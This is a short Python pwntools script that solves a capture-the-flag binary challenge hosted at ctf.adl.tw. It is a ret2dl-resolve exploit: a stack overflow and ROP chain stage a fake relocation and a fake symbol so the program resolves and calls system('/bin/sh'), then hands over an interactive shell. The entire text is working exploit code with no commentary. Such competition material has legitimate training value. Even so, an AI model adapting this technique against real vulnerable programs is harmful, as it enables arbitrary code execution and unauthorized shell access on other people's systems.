from pwn import *

r = remote("ctf.adl.tw", 11009)
# r = remote("127.0.0.1", 8888)
context.arch = "i386"

buf = 0x0804a400
read_plt = 0x08048340
read_got = 0x0804a010
addr_plt_start = 0x08048320
addr_rel_plt = 0x080482d8
index_off = (buf + 28) - addr_rel_plt
addr_dynsym = 0x080481d0
addr_dynstr = 0x08048240
addr_fake_sym = buf + 36
align = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
addr_fake_sym = addr_fake_sym + align
index_dynsym = (addr_fake_sym - addr_dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(read_got) + p32(r_info)
st_name = (addr_fake_sym + 16) - addr_dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

pop_ebp = 0x080484fb
pop_esi_edi_ebp = 0x080484f9
leave_ret = 0x080483d8

payload1 = "a" * 0x14 + flat([read_plt, pop_esi_edi_ebp, 0, buf, 0x100, pop_ebp, buf, leave_ret])
r.send(payload1)

cmd = "/bin/sh\x00"

payload2 = flat(["aaaa", addr_plt_start, index_off, "aaaa", buf+80, "aaaa", "aaaa"])
payload2 += fake_reloc
payload2 += "b" * align
payload2 += fake_sym
payload2 += "system\x00"
payload2 += "a" * (80 - len(payload2))
payload2 += cmd
payload2 += "a" * (100 - len(payload2))
r.send(payload2)

r.interactive()

